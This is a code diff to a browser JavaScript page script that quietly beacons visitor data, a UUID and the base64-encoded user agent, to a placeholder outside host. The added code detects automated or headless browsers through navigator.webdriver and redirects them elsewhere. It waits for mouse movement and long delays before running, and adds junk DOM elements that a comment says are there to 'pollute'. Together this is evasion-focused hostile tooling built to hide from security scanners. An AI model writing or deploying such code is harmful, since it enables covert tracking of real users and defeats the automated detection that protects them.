@@ -9,8 +9,9 @@ function delay(time) {
 }
 
 // Tracker request 
-function trck(){
+function trck() {
     let uuid = crypto.randomUUID();
+    let uagent = btoa(navigator.userAgent);
     /** let postObj = { 
         id: "test", 
         title: "hello", 
@@ -18,33 +19,34 @@ function trck(){
     }
     let post = JSON.stringify(postObj)
     **/
-    const trackUrl = `https://trackingsite/ID?uuid=${uuid}`;
+    const trackUrl = `https://hooksite.blahhhhh?UUID=${uuid}&UserAgent=${uagent}`;
     let xhr = new XMLHttpRequest();
     xhr.open('GET', trackUrl, true);
-    xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8')
+    //xhr.setRequestHeader('Content-type', 'application/json; charset=UTF-8')
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.send();
 }
 
 // Function hopper/junk block. This is used to pollute a little and then run the rest. 
-function n(){
+function n() {
     var daDiv = document.createElement("img");
     document.body.appendChild(daDiv);
     trck();
 }
 
-function y(){
+function y() {
     var daDiv = document.createElement("script");
     document.body.appendChild(daDiv);
     delay(100).then(() => n());
 }
 
-function s(){
+function s() {
     var daDiv = document.createElement("div");
     document.body.appendChild(daDiv);
     delay(100).then(() => y());
 }
 
-function hopper(){
+function hopper() {
     delay(500).then(() => s());
 }
 
@@ -61,26 +63,39 @@ function domBuild() {
         // call the hopper
         hopper();
     } else {
-        //alert('Div not loaded :(');
         void(0);
     }
 }
 
+//navigator check
+function navcheck(){
+    // check if cookies are enabled
+    // check if the UA is set via automation or headless
+    if (navigator.cookieEnabled && navigator.webdriver == false){
+        console.log('ayy')
+        mousechk();
+    } else {
+        // since this is likely really automated, just redirect the user.
+        window.location.href = "https://gtfkd.com/"
+    };
+}
+
+
 // check for mouse movement
-function mousechk(){
+function mousechk() {
     // if the user moves the mouse, delay and load
     var moved = false
-    window.onmousemove = function(e){
-        if(!moved){
+    window.onmousemove = function (e) {
+        if (!moved) {
             moved = true;
             // delay just a sec 
-            delay(1700).then(() => domBuild());
+            delay(5700).then(() => domBuild());
         }
-     }
+    }
 }
 
 // Check to see if the DOM is loaded and then run via event listener
 window.addEventListener("load", function () {
     // code to run after DOM load..
-    mousechk();
+    navcheck();
 });
